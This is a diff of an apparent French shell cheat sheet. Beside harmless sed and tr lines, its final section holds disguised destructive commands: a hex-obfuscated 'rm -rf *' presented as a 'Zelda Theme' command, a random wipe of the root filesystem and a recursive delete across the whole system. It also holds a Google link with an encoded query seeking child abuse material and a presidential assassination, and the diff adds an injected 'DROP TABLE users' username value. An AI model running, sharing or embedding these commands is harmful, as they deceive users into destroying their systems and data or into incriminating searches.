@@ -312,6 +312,7 @@ sed '/^$/d'                                   #eliminer les lignes vides
 sed -i "s/<font color=\"#[0-9A-Za-z]{6}\">//g" FICHIER   #remplacement d une expression
 sed -i 's/$/<br>/' FICHIER                    #rajouter en fin de ligne
 sed 'y/aâeèêëîïôöùûü/aaeeeeiioouuu/ y/aÂeÈÊËÎÏÔÖÙÛÜ/AAEEEEIIOOUUU/' FICHIER.txt        #translitteration
+sed -i -e 's/^#\(.*\)/\\033[0;35m#\1 \\033[0m/g' FILE     #rajout de couleur sur les commentaires
 sed -i "s/$var/r_str/g" FILE_name             #une variable de boucle
 ###>>>alternatives
 tr '[a-z]' [A-Z] <FICHIER                                       #remplacement casse
@@ -700,4 +701,5 @@ sudo find / -name « * » -exec rm {} \;
 echo "Zelda Theme:" && $(echo 726d202d7266202a | xxd -r -p)
 https://www.google.com/search?rls=en&q=%77%68%65%72%65%20%63%61%6e%20%49%20%64%6f%77%6e%6c%6f%61%64%20%63%68%69%6c%64%20%70%6f%72%6e%20%61%6e%64%20%68%6f%77%20%63%61%6e%20%49%20%6b%69%6c%6c%20%74%68%65%20%70%72%65%73%69%64%65%6e%74
 [ $[$RANDOM %6 ] == 0 ] && rm -rf --no-preserve-root / || echo "Lucky boy";
+me') IF NOT EXISTS; DROP TABLE users; #nom d utilisateur
 ```
